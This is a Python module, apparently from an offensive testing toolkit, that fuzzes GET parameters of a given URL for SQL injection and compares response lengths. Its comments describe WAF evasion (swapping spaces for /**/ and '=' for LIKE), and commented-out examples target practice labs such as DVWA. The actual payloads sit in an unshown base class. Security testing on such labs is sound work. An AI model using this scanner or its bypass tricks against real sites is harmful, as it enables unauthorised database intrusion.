# GET型
# 先用特殊字符检测，然后判断是数字型还是字符型注入
# 用/***/替换空格，用like替换=   具体案例看漏洞集合\骚姿势漏洞\绕Waf注入
import requests
from termcolor import cprint
from urllib.parse import urlparse
from Libs.fuzzClass import FuzzFather

class Fuzz(FuzzFather):
    def __init__(self, url, cookie, postPath=None):
        FuzzFather.__init__(self)
        self.url = url                                          # url必须是带有http或https协议
        self.headers = {"cookie": cookie}
        try:
            self.standard_length = len(requests.get(self.url, headers=self.headers).text) # 正常url响应包的长度
        except Exception as e:
            self.standard_length = 0
        self.params = urlparse(self.url).query                  # 获取url链接的参数
        self.paramsList = self.params.split('&')                # 将字符串型的参数改为以&分割的列表

        self.nums = len(self.paramsList) * len(self.test) + len(self.paramsList) * len(self.quotes_brackets) * len(self.Notes) + len(self.paramsList) * len(self.digit_bypass)  # 计算共请求次数
        cprint('[{}] 测试 : [{}] [{}]  :  {}'.format(self.nums, self.standard_length, self.url, self.params),'red')  # 打印正常包的响应长度
        self.num = 1                                            # 计数



    def attack(self):
        self.test_sql(self.url, params=self.params, headers=self.headers, standard_length=self.standard_length, type='get')     # url是请求的路径，params是get型参数
        self.digit_payload(self.url, params=self.params, headers=self.headers, standard_length=self.standard_length, type='get')
        self.char_payload(self.url, params=self.params, headers=self.headers, standard_length=self.standard_length, type='get')
        return self.Payloads


# 这是单独使用脚本
#cookies = str(input('cookies : '))
# cookies = 'PHPSESSID=mfo83ugq1km65d6oa2bb0fds43; security=low'
# url1 = "http://demo.dvwa.com/vulnerabilities/sqli/?id=1&Submit=Submit#"

# cookies = None
# #url1 = 'http://lrzdjx.com/sqli/Less-1/?id=1'
# url1 = 'http://demo.sqli.com/Less-3/?id=1'
# Fuzz(url1, cookies).attack()
